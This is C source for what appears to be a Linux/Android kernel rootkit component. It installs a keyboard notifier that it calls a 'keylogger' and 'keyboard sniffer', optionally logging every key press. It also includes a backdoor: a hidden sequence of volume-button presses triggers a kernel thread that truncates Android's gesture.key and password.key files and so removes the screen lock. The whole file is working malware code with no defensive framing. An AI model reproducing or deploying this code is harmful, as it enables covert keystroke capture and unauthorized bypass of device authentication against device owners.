#include "common.h"
#include <linux/keyboard.h>
#include <linux/kthread.h>

#if defined(_CONFIG_UNLOCK_)
struct task_struct *ts;
unsigned long sequence_i = 0;
volatile unsigned long to_unlock = 0;

DECLARE_WAIT_QUEUE_HEAD(unlocker_event);

unsigned long sequence[] = {
    42,     // Volume Up downpress
    63232,
    63232,
    58,     // Volume Down downpress
    61959,
    61959,
    42,     // Volume Up uppress
    63232,
    63232,
    58,     // Volume Down uppress
    61959,
    61959
};

#define SEQUENCE_SIZE sizeof(sequence)/sizeof(unsigned long)
#endif

int notify ( struct notifier_block *nblock, unsigned long code, void *_param )
{
    struct keyboard_notifier_param *param = _param;

    #if __DEBUG_KEY__
    printk("KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
    #endif

    #if defined(_CONFIG_UNLOCK_)
    if ( sequence[sequence_i] == param->value )
    {
        if ( ++sequence_i == SEQUENCE_SIZE )
        {
            #if __DEBUG__
            printk("Key sequence detected, unlock the screen!\n");
            #endif

            to_unlock = 1;
            sequence_i = 0;
            wake_up_interruptible(&unlocker_event);
        }
    }
    else
        sequence_i = 0;
    #endif

    return NOTIFY_OK;
}

#if defined(_CONFIG_UNLOCK_)
int unlocker ( void *data )
{
    while ( 1 )
    {
        wait_event_interruptible(unlocker_event, (to_unlock == 1));

        #if __DEBUG__
        printk("Inside the unlocker thread, removing screen lock\n");
        #endif

        #if defined(_CONFIG_X86_)
        // Kill screenlock
        #else // ARM
        filp_close(filp_open("/data/system/gesture.key", O_TRUNC, 0), NULL);
        filp_close(filp_open("/data/system/password.key", O_TRUNC, 0), NULL);
        #endif

        to_unlock = 0;

        if ( kthread_should_stop() )
            break;
    }

    return 0;
}
#endif

static struct notifier_block nb = {
    .notifier_call = notify
};

void keylogger_init ( void )
{
    #if __DEBUG__
    printk("Installing keyboard sniffer\n");
    #endif

    register_keyboard_notifier(&nb);
    #if defined(_CONFIG_UNLOCK_)
    ts = kthread_run(unlocker, NULL, "kthread");
    #endif
}

void keylogger_exit ( void )
{
    #if __DEBUG__
    printk("Uninstalling keyboard sniffer\n");
    #endif

    #if defined(_CONFIG_UNLOCK_)
    kthread_stop(ts);
    #endif
    unregister_keyboard_notifier(&nb);
}
